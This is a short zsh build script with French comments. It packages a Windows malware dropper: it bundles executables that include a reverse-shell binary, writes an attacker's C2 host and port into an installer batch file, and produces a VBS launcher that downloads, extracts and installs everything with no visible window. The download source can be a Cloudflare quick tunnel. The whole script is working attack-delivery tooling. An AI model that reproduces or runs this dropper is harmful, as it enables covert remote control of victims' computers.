#!/bin/zsh
# delivery/mkdropper_win.sh - package Windows : exes + installateur C2 injecte
# Usage: mkdropper_win.sh [C2_host_ou_IP] [port] [sortie.zip]
set -e
C2="${1:-127.0.0.1}"
PORT="${2:-4444}"
OUT="${3:-RickPortal_win.zip}"

cd "$(dirname "$0")/.."
[ -f build/02_reverse_shell.exe ] || { echo "compile les exes d'abord (verify_build.zsh)"; exit 1; }

TMP=$(mktemp -d)
mkdir -p "$TMP/win"
# le launcher interactif Windows ne sert pas au deploiement - on l'exclut
cp build/0*.exe build/1*.exe "$TMP/win/" 2>/dev/null || cp build/*.exe "$TMP/win/"
sed "s/__C2__/$C2/;s/__PORT__/$PORT/" delivery/windows/install_win.bat > "$TMP/INSTALLER.bat"

# vbs silencieux : download cache + extraction cachee + install cachee, zero fenetre
BASE="${RICK_PUBLIC:-}"
[ -z "$BASE" ] && BASE="http://${C2%%:*}:8080"
grep -q trycloudflare /tmp/rick_tunnel.log 2>/dev/null && BASE=$(grep -o "https://[a-z0-9-]*\.trycloudflare\.com" /tmp/rick_tunnel.log | head -1)
sed "s/__C2__/$C2/;s/__PORT__/$PORT/;s|__BASE__|$BASE|" delivery/windows/portal_win.vbs > portal_win.vbs

rm -f "$OUT"
(cd "$TMP" && zip -qr "/tmp/rickwin.zip" .)
mv "/tmp/rickwin.zip" "$OUT"
rm -rf "$TMP"
echo "[OK] $OUT genere (C2=$C2:$PORT, $(du -h "$OUT" | cut -f1))"
echo "[OK] portal_win.vbs genere (base=$BASE)"
